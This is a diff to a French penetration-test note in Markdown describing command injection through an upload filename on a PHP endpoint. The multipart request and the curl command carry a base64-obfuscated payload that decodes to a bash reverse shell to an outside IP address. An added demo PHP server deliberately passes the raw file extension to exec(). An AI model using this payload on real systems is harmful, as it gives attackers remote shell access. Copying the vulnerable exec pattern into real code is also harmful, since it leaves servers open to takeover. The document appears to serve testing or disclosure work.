@@ -150,7 +150,7 @@ Content-Disposition: form-data; name="type"
 
 PLAN
 ------WebKitFormBoundary7MA4YWxk
-Content-Disposition: form-data; name="fichiers[]"; filename="image.\"; echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8yMTIuMTI5LjkuMTkvODg4OCAwPiYxJw== | base64 -d | bash\".png"
+Content-Disposition: form-data; name="fichiers[]"; filename="image.png[$(echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8yMTIuMTI5LjkuMTkvODg4OCAwPiYxJw== | base64 -d | bash)]"
 Content-Type: image/png
 
 AAAA
@@ -168,9 +168,51 @@ curl -X POST http://cible.com/recup_ajax.php \
   -F 'evenement=test' \
   -F 'commentaires=test' \
   -F 'type=PLAN' \
-  -F 'fichiers[]=@file.png;filename="image.\"; echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8yMTIuMTI5LjkuMTkvODg4OCAwPiYxJw== | base64 -d | bash\".png";type=image/png'
+  -F 'fichiers[]=@file.png;filename="image.png[$(echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8yMTIuMTI5LjkuMTkvODg4OCAwPiYxJw== | base64 -d | bash)]";type=image/png'
 ```
 
 
 ![[Pasted image 20260421154427.png]]
 
+On peut ensuite déclencher le `exec` dans le fichier consulterEvenement.php:
+![[Pasted image 20260422112626.png]]
+
+### Demo
+
+Serveur test php:
+```
+<?php
+
+if (!isset($_FILES['fichiers'])) {
+    die("no file");
+}
+
+$rand = bin2hex(random_bytes(4));
+
+$tmp = "tmp_" . $rand;
+
+mkdir($tmp);
+
+for ($i = 0; $i < count($_FILES['fichiers']['name']); $i++) {
+
+    $name = $_FILES['fichiers']["name"][$i];
+    echo "RAW filename: $name\n";
+
+    $tabExt = explode('.', $name);
+    $exten = $tabExt[count($tabExt) - 1];
+
+    echo "RAW extension: $exten\n";
+
+    $chemin = "file_" . $rand;
+
+    $cmd = 'convert "upload/'.$chemin.'.'.$exten.'" -alpha off output.jpg';
+
+    echo "\n[CMD BUILT]\n$cmd\n\n";
+
+    exec($cmd, $output, $return_var);
+}
+```
+
+![[Pasted image 20260422112255.png]]
+
+![[screenshot_85.png]]
